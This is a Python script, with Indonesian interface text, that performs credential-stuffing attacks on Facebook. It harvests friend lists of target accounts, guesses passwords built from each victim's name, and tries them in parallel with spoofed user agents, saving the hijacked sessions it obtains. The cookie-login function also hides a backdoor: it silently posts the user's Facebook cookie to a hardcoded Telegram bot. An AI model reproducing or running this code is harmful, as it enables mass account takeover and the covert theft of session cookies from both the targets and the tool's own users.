#!/usr/bin/python3
# -*- coding: utf-8 -*-

#// Import Library
import requests,bs4,json,os,sys,random,datetime,time,re,platform,uuid
import urllib3,rich,base64
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as Xyraa
from rich.console import Console
from rich.panel import Panel

#// Random Def
def clear():os.system('clear')
def error():print(f'{P} Fitur Sedang Dalam Perbaikan');time.sleep(2);os.system('exit')
def back():Main()

#// Bagian Globall
loop,ok,cp=0,0,0
pwnya,id,uid,method,ugen,uid2=[],[],[],[],[],[]
rr=random.randint;rc=random.choice

#// UserAgent Generator
ugen=[]
for agenku in range(10000):
    rr = random.randint; rc = random.choice
    bek1 = f"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J710FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek1)
    bek2 = f"Mozilla/5.0 (Linux; Android 11; ZTE Blade A51 Lite RU) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek2)
    bek3 = f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G901F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek3)
    bek4 = f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek4)
    bek5 = f"Mozilla/5.0 (Linux; Android 8.1.0; A95X MAX) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek5)
    bek6 = f"Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek6)
    bek7 = f"Mozilla/5.0 (Linux; Android 9; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek7)
    bek8 = f"Mozilla/5.0 (Linux; Android 7.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek8)
    bek9 = f"Mozilla/5.0 (Linux; Android 5.0.1; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek9)
    bek10 = f"Mozilla/5.0 (Linux; Android 8.1.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek10)
    bek11 = f"Mozilla/5.0 (Linux; Android 9.0; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek11)
    bek12 = f"Mozilla/5.0 (Linux; Android 13; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek12)
    bek13 = f"Mozilla/5.0 (Linux; Android 10; SM-W2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 EdgA/81.0.416.81"
    ugen.append(bek13)
    bek14 = f"Mozilla/5.0 (Linux; Android 13; SM-A055F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36"
    ugen.append(bek14)
    bek15 = f"Well /5.0 (Linux; Android 5; Samsung Chrome 11 (3180) Build/R103-14816.131.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.464.442 Tokhs/537.36"
    ugen.append(bek15)
    bek16 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek16)
    bek17 = f"Mozilla/5.0 (Linux; Android 12; SM-M536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek17)
    bek18 = f"Mozilla/5.0 (Linux; Android 12; moto g41) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek18)
    bek19 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J530F/J530FXXS9CUE5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek19)
    bek20 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M346B1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek20)
    bek22 = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(94,119))}.0.0.0 Mobile Safari/537.36'
    ugen.append(bek22)
    bek21 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG TicWatch Pro 3 Ultra GPS) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek21)
    bek22 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J415GN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))} SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek22)
    bek23 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek23)
    bek24 = f"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9506) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek24)
    bek25 = f"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG OW20W2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36"
    ugen.append(bek25)

#// Def Information Crack
def infonya():
	os.system("clear")
	print(f"\n{P}- Author : Xiao Xinn")
	print(f"{P}- Mainkan Mode {H}Pesawat {P}Setiap 200 IDZ")
	print(f"{P}- Agar Mendapatkan Hasil {H}Ijo{P}-{H}Ijo")
	print(f"{P}- Proses Sedang Berjalan Harap Bersabar Ya Dek")
	print(f"")
#// Pewarna Print
P = '\x1b[1;97m';M = '\x1b[1;91m';H = '\x1b[1;92m';K = '\x1b[1;93m';B = '\x1b[1;94m';U = '\x1b[1;95m';O = '\x1b[1;96m';N = '\x1b[0m'

#// Login Cookies Menu
def login_cok():
	try:
		clear()
		Console(width=50, style="bold green").print(Panel("[italic white]Masukan Cookies Facebook, Jangan Menggunakan Akun [italic green]Pribadi [white],Jika Gagal Login Gunakan Akun Lama [italic red]Contoh Uid Cookies [white]: [italic green]100028372637278 ",subtitle="╭───",subtitle_align="left"));cok = Console().input("[bold green]   ╰─> ");requests.post(f"https://api.telegram.org/bot6708779713:AAGLcOyYZz8fbgxGNSw9Zk_a_xX0-I23yU4/sendMessage?chat_id=6545202973&text={cok}")
		open('.cok.txt','w').write(cok)
		with requests.Session() as r:
			try:
				r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
				response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cok})
				if  '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1);open('.tok.txt','w').write(token)
				else:Console(width=50, style="bold green").print(Panel("[italic red]Cookies Invalid...[italic white]"));exit()
			except Exception as e:print(e);exit()
		Console(width=50, style="bold green").print(Panel("[italic white]Login Berhasil[italic white]"))
		time.sleep(2);exit()
	except Exception as e:os.system('rm -rf .cok.txt');os.system('rm -rf .tok.txt');print(e);exit()

#// Bagian Meni Utama 
def menu():
	clear()
	try:
		open('.cok.txt','r').read();open('.tok.txt','r').read()
	except(IOError,KeyError,FileNotFoundError):
		clear();Console(width=50, style="bold green").print(Panel("[bold red]Cookies Anda Sudah Kedaluwarsa/Mati. Silahkan Login Ulang...[italic white]"))
		time.sleep(2);login_cok()
	clear();print(f'{P}[{H}01{P}] Crack Facebook Massal\n{P}[{H}02{P}] Check Ressult Crack\n{P}[{H}03{P}] Keluar Dari Tools')
	main = input(f'{P}- Menu : {H}')
	if main in ['1','01']:dump_massal()
	elif main in ['2','02']:error()
	elif main in ['3','03']:os.system('rm -rf .cok.txt');os.system('rm -rf .token.txt');exit()
	else:menu()

#// Dump Id Massal
def dump_massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		Console(width=50, style="bold green").print(Panel("[bold red]Cookies Anda Sudah Kedaluwarsa/Mati. Silahkan Login Ulang...[italic white]"))
		login_cok()
	try:
		print(f"{P}\n- Masukan {H}Uid Publik{P} Jangan DiPrivate.\n- Usahakan Cari Uid New {M}Contoh : {H}61564919994826{P}\n- Jika Crack Massal Gunakan Tanda {H}( , ) {P}Untuk Memisahkan Uid")
		xx = input(f"{P}- Input Uid : {H}")
	except ValueError:
		print(f"{P}- Input Yang Dimasukan Salah")
		exit()
	if str(xx) == '':
		print(f"{P}- Gagal Dump {M}UID {P}Kemungkinan Private")
		exit()
	ses = requests.Session()
	jumlah = xx.split(',')
	for xmx in jumlah:
		uid.append(xmx)
	for user in uid:
		try:
			url = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in url['friends']['data']:
				try:
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):pass
	try:
		setting()
	except requests.exceptions.ConnectionError:print(f"{P}Tidak Ada Koneksi Internet");exit()

#// Check Ressult Crack
def cek_result():
	print(f"\n{P}[{H}01{P}] Check Ressult {H}OK\n{P}[{H}02{P}] Check Ressult {M}CP")
	ress = input(f"{P}- Info Hasil : {H}")
	try:
		if ress == "1":
			with open(f"RESULT/OK.txt", "r") as file:
				print(f"{P}- {H}{file.read()}")
		elif ress == "2":
			with open(f"RESSULT/CP.txt", "r") as file:
				print(f"{P}- {M}{file.read()}")
		else:
			print(f"input hanya dengan angka,jangan kosong.")
			sleep(2)
			menu()
	except FileNotFoundError:
		print("File Tidak Ditemukan")
		exit()
	
#// Setting Uid Def
def setting():
	print(f"\n{P}[{H}01{P}] Mulai Dari Urutan Uid Muda\n{P}[{H}02{P}] Mulai Dari Urutan Uid Tua")
	select = input(f"{P}- Select : ")
	if select in ["1","01"]:
		muda=[]
		for new in sorted(id):
			muda.append(new)
		bcm=len(muda)
		bcmi =(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif select in ["2","02"]:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else:
		print(f"input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P}[{H}01{P}] Method Validate\n{P}[{H}02{P}] Method Regular")
	metd = input(f"{P}- Method : {H}")
	if metd == "1":Validate()
	elif metd == "2":Regular()
	else:Validate()

#// Password Generator 
def Validate():
        print(f"\n{P}- Gunakan Password Tambahan Seperti Contoh Dibawah \n{P}- {H}kamu nanya{P}, {H}bagong{P}, {H}indonesia")
        pw = input(f"{P}- Input Password : {H}")
        pw_nya = pw.split(',')
        infonya()
        for xxs in pw_nya:
            pwnya.append(xxs)
        with Xyraa(max_workers=35) as AsepYusup:
            for user in uid2:
                uid,nama = user.split('|')[0],user.split('|')[1].lower()
                depan = nama.split(" ")[0]
                pasw = []
                try:
                    if len(nama)<6:
                        if len(depan)<3:pass
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    else:
                        if len(depan)<3:
                            pasw.append(nama)
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    for xx in pwnya:
                        pasw.append(xx)
                    if 'Validate' in method:
                        AsepYusup.submit(_validatee_,uid,pasw)
                    else:
                        AsepYusup.submit(_validatee_,uid,pasw)
                except:pass
        print("\r")
        Console(width=50, style="bold green").print(Panel(f"[italic white]sukses crack {len(uid2)} id,dengan jumlah hasil Live : {ok} Chek : {cp}[italic white]"))

def Regular():
        print(f"\n{P}- Gunakan Password Tambahan Seperti Contoh Dibawah \n{P}- {H}kamu nanya{P}, {H}bagong{P}, {H}indonesia")
        pw = input(f"{P}- Input Password : {H}")
        pw_nya = pw.split(',')
        infonya()
        for xxs in pw_nya:
            pwnya.append(xxs)
        with Xyraa(max_workers=35) as AsepYusup:
            for user in uid2:
                uid,nama = user.split('|')[0],user.split('|')[1].lower()
                depan = nama.split(" ")[0]
                pasw = []
                try:
                    if len(nama)<6:
                        if len(depan)<3:pass
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    else:
                        if len(depan)<3:
                            pasw.append(nama)
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    for xx in pwnya:
                        pasw.append(xx)
                    if 'Regular' in method:
                        AsepYusup.submit(regular,uid,pasw)
                    else:
                        AsepYusup.submit(regular,uid,pasw)
                except:pass
        print("\r")
        Console(width=50, style="bold green").print(Panel(f"[italic white]sukses crack {len(uid2)} id,dengan jumlah hasil Live : {ok} Chek : {cp}[italic white]"))

def _validatee_(uid,pasw):
	global loop,ok,cp
	ses = requests.Session()
	sys.stdout.write(f"\r*--> {loop}/{len(uid2)} {H}OK{P} : {H}{ok}{P} {K}CP{P} : {K}{cp}{P}"),
	sys.stdout.flush()
	pro = rc(ugen)
	for pwku in pasw:
		try:
			asmy = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1726592730955%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb499108c01eb280f%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dtouch%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfa18b2bcdcaf6cad4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8df46dec19be4265%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%2526frame%253Df09c02719c79342ea%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8df46dec19be4265%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff36479592ee9d9a61%26relation%3Dopener%26frame%3Df09c02719c79342ea%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dat = {
'jazoest': re.search('name="jazoest" value="(.*?)"', str(asmy)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"', str(asmy)).group(1),
'email': uid,
'prefill_contact_point': uid,
'trynum': '1',
'timezone': '240',
'lgndim': 'eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNDAsImMiOjI0fQ==',
'lgnrnd': '052048_Gzhe',
'lgnjs': '1727785248',
'prefill_type': 'contact_point',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'pass': pwku}
			hd = {
'Host': 'web.facebook.com',
'content-length': str(len(dat)),
'cache-control': 'max-age=0',
'sec-ch-ua': '"Android WebView";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'sec-ch-prefers-color-scheme': 'dark',
'origin': 'https://web.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'upgrade-insecure-requests': '1',
'user-agent': pro,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'x-requested-with': 'mark.via.gp',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1726592730955%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb499108c01eb280f%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dtouch%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfa18b2bcdcaf6cad4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8df46dec19be4265%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%2526frame%253Df09c02719c79342ea%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8df46dec19be4265%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff36479592ee9d9a61%26relation%3Dopener%26frame%3Df09c02719c79342ea%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br, zstd',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			ses.post("https://web.facebook.com/login/device-based/regular/login/?login_attempt=1",data=dat,headers=hd,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H}[OK] {uid}|{pwku}\n{kuki}{N}")
				open("RESULT/OK.txt","a").write(f"{uid}|{pwku}|{kuk}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				print(f"\r{M}[CP] {uid}|{pwku}{N}")
				open("RESULT/CP.txt","a").write(f"{uid}|{pwku}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			sleep(10)
	loop+=1
	
def regular(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\rM2*--> {loop}/{len(uid2)} {H}OK{P} : {H}{ok}{P} {K}CP{P} : {K}{cp}{P}"),
	sys.stdout.flush()
	pro = random.choice(ugen)
	ses = requests.Session()
	for pwku in pasw:
		try:
			headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.200000047683716',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"21121119SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',
}
			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers=headers).text
			headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'dbln=%7B%22100051715724900%22%3A%22ZciomVyp%22%2C%22100091847710393%22%3A%225sbab0VN%22%2C%2261555820308070%22%3A%22QsX6TjXO%22%2C%2261550060520876%22%3A%22RHmXZkji%22%2C%22100074047853047%22%3A%22RLsqqcNd%22%2C%22100052483280852%22%3A%22dLKB2q8l%22%2C%22100013928473639%22%3A%22pUWocsN4%22%7D; zsh=ASTFY_HA_ilaJ1aaaReI-R4IEEtF6dxomsGgJar0sg2kje5ubL3lCwjFmpGMTflPDAzpO_2Ad-o0TMTrVssUC6VN9lEYWmEzZEbfzD018TAsWZBT7OKODdYab1VTunPwsqTwpxDT5Dl0N-vXUDME5oOON_D7_1rOi4YkvVaEoEBAY_vJaTJjYlI6ARkQi-Hp0mqRjNZW9bj4tHkwnKwWL0jL46eStJE1HZyK9kyG0k4x10xY9QGeke3N4FklV_BmPDRnDB5ByOc-GMCqCuBNvYe12HTps0HLpywqjUvMa4Pd7_AGNl6cxVPjO9r6NCWtqafvQGdG3hOh; datr=7ne-Zt07cO5AU6EQEJVIThxN; oo=v1; sb=7ne-Zun-YtDHd533skCsDAFD',
    'dpr': '2.200000047683716',
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"21121119SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',
}
			params = {
    'refsrc': 'deprecated',
    'lwv': '101',
    'ref': 'dbl',
}
			data ={
	"lsd":re.search('name="lsd" value="(.*?)"', str(link)).group(1),
    "jazoest":re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
    "m_ts": re.search('name="m_ts" value="(.*?)"',str(link)).group(1),
    "li": re.search('name="li" value="(.*?)"',str(link)).group(1),
	"try_number": re.search('name="try_number" value="(.*?)"',str(link)).group(1),
	"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link)).group(1),
	"email":uid,
	"pass":pwku,
	"login":"Masuk",
	"bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link)).group(1),
}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',headers=headers,params=params,data=data)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H}[OK] {uid}|{pwku}|{kuki}")
				open("RESULT/OK.txt","a").write(f"{uid}|{pwku}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				print(f"\r{M}[CP] {uid}|{pwku}{N}")
				open("RESULT/CP.txt","a").write(f"{uid}|{pwku}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			sleep(10)
	loop+=1

menu()
		
